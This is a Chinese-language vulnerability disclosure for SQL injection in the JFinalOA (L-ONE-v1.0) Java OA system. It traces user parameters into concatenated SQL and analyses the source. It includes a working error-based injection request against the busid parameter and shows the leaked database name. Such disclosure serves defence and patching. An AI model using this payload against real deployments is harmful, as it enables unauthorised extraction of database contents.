# L-ONE-v1.0 JFinalOA SQL注入漏洞报告

## 漏洞介绍

JFinalOA（开源Java OA系统，基于JFinal 4.6框架）后台多处接口存在SQL注入。`busid`、`id`、`taskid` 等参数通过字符串拼接方式直接嵌入SQL语句，未使用参数化查询。

JFinal ActiveRecord 的 `Db.find()` / `Db.paginate()` 方法接受拼接后的SQL字符串，`'"+param+"'` 模式导致闭合引号注入。系统无全局SQL过滤，所有参数均直接拼接。

攻击者登录后即可执行报错注入、UNION注入、盲注提取数据库数据。

---

## 影响版本

JFinalOA (L-ONE-v1.0) （最新版）

## 利用条件

- 登录后即可利用（普通用户权限即可）

---

## 漏洞复现

### 用户参数进入SQL语句的调用链

```
AttachmentController.getBusinessUploadList()
  → getPara("busid")                    ← 接受用户参数
  → AttachmentService.getPage(busid)    ← 传入service层
  → "and o.business_id='"+busid+"'"    ← 拼接SQL
  → Db.paginate(sql)                    ← 执行SQL
```

提取当前数据库名：

```
GET /JPointLion/admin/sys/attachment/getBusinessUploadList?pageNumber=1&pageSize=10&busid=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))%23
```

返回：`XPATH syntax error: '~jfinaloa'`

![image-20260804100151780](https://github.com/fangtang7/picx-images-hosting/raw/master/JFinalOA/image-20260804100151780.4joth01zid.webp)



---

## 源码分析

AttachmentController.java 第50-56行，getPara("busid","") 从HTTP GET参数中获取 busid 值，没有任何过滤，直接传给 Service。

![image-20260804100820217](https://github.com/fangtang7/picx-images-hosting/raw/master/JFinalOA/image-20260804100820217.8dxkzykgoa.webp)

AttachmentService.java 第25-31行直接拼接拼接参数

![image-20260804100939564](https://github.com/fangtang7/picx-images-hosting/raw/master/JFinalOA/image-20260804100939564.8vnmojmby0.webp)
